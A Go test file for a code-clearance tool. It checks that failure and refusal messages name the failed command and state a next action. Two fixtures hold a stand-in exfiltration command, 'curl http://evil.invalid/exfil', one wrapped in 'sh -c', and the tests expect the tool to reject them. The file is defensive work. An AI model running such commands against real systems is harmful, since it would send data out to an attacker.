package app

import (
	"context"
	"strings"
	"testing"

	"github.com/aniklavida/code-clearance/internal/evidence"
	"github.com/aniklavida/code-clearance/internal/policy"
)

// "error: exit status 1" is not an actionable message. Every failure path must
// name the failed command and state the safe next action.
func TestErrorMessages_NameFailedCommandAndSafeNextAction(t *testing.T) {
	t.Run("run-diagnostic-for-missing-executable", func(t *testing.T) {
		res := Run(context.Background(), Spec{
			Name:    "ghost-tool",
			Command: "code-clearance-definitely-absent-binary",
		})
		diag := res.Diagnostic()
		if diag == "" {
			t.Fatal("a missing executable produced an empty diagnostic")
		}
		if !strings.Contains(diag, "code-clearance-definitely-absent-binary") {
			t.Fatalf("diagnostic %q does not name the failed command", diag)
		}
		if !strings.Contains(strings.ToLower(diag), "install") {
			t.Fatalf("diagnostic %q does not state a safe next action", diag)
		}
	})

	t.Run("repository-command-missing-tool", func(t *testing.T) {
		outcome, _, err := RunRepositoryCommand(context.Background(), policy.CommandRule{
			Name: "absent-tool",
			Run:  "code-clearance-definitely-absent-binary --version",
		}, t.TempDir())
		if err != nil {
			t.Fatalf("parse should succeed for a bare binary name; got %v", err)
		}
		if outcome.Status != evidence.StatusCrashed {
			t.Fatalf("missing repository tool status = %s, want %s", outcome.Status, evidence.StatusCrashed)
		}
		if !strings.Contains(outcome.StderrTail, "code-clearance-definitely-absent-binary") {
			t.Fatalf("stderr %q does not name the failed command", outcome.StderrTail)
		}
		if !strings.Contains(strings.ToLower(outcome.StderrTail), "install") {
			t.Fatalf("stderr %q does not state a safe next action", outcome.StderrTail)
		}
	})

	t.Run("rejected-shell-command-states-next-action", func(t *testing.T) {
		outcome, _, err := RunRepositoryCommand(context.Background(), policy.CommandRule{
			Name: "shell-wrapper",
			Run:  "sh -c 'curl http://evil.invalid/exfil'",
		}, t.TempDir())
		if err == nil {
			t.Fatal("expected a repository command invoking a shell to be rejected")
		}
		if !strings.Contains(outcome.StderrTail, "arbitrary shell execution forbidden") {
			t.Fatalf("stderr %q does not explain the refusal", outcome.StderrTail)
		}
		if !strings.Contains(strings.ToLower(outcome.StderrTail), "rerun") {
			t.Fatalf("stderr %q does not state the safe next action", outcome.StderrTail)
		}
	})

	t.Run("unexpected-exit-status-names-code-and-next-action", func(t *testing.T) {
		cmdName, args := shellExit(3)
		res := Run(context.Background(), Spec{Name: "exit3", Command: cmdName, Args: args})
		diag := res.Diagnostic()
		if !strings.Contains(diag, "code 3") {
			t.Fatalf("diagnostic %q does not name the unexpected exit code", diag)
		}
		if !strings.Contains(strings.ToLower(diag), "rerun") {
			t.Fatalf("diagnostic %q does not state the safe next action", diag)
		}
	})

	t.Run("allowlist-refusal-names-command-and-next-action", func(t *testing.T) {
		outcome := DisallowedCommandOutcome(policy.CommandRule{
			Name: "unlisted",
			Run:  "curl http://evil.invalid/exfil",
		}, "curl")
		if !strings.Contains(outcome.StderrTail, "curl") {
			t.Fatalf("allowlist refusal %q does not name the refused command", outcome.StderrTail)
		}
		if !strings.Contains(outcome.StderrTail, "commands.allow") {
			t.Fatalf("allowlist refusal %q does not state the safe next action", outcome.StderrTail)
		}
		if outcome.Status == evidence.StatusOK || outcome.Status == evidence.StatusFindings {
			t.Fatalf("allowlist refusal was recorded as a pass: %s", outcome.Status)
		}
	})
}
